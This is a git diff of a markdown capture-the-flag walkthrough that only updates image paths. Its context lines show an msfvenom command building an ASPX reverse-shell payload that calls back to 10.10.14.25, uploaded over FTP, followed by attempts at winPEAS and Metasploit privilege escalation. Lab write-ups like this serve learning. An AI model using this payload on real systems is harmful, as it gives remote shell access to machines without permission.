@@ -51,7 +51,7 @@ msfvenom -a x86 --payload windows/shell_reverse_tcp -f aspx LHOST=10.10.14.25 LP
 
 and upload this file through FTP and start a listener.
 
-![](../../.gitbook/assets/image%20%285%29%20%282%29%20%281%29.png)
+![](../../.gitbook/assets/image%20%285%29%20%282%29%20%282%29%20%281%29.png)
 
 so, we got a revershell as the iis user, and not sure how I should proceed from now, So, I'll just try to upload a winpeas.exe file and run the local PrivEsc enumeration
 
@@ -66,7 +66,7 @@ cmd /c "copy <sourcefile> X:\"
 
 so, this worked, but when I try to run the winpeas.exe command, it doesn't seem to work, which is when I've realized that I've been trying to run x64 winpeas on x86 machine. Even after changing, that didn't seem to have worked, So, I'm not sure what I can do at this stage
 
-![](../../.gitbook/assets/image%20%287%29%20%281%29.png)
+![](../../.gitbook/assets/image%20%287%29%20%281%29%20%281%29.png)
 
 So, I've left to try the metasploit way now, where we can search for local exploits etc \(actually this I've got from ippsec video for this specific box\), so lets try that ourselves \(generating a meterpreter shell\)
 
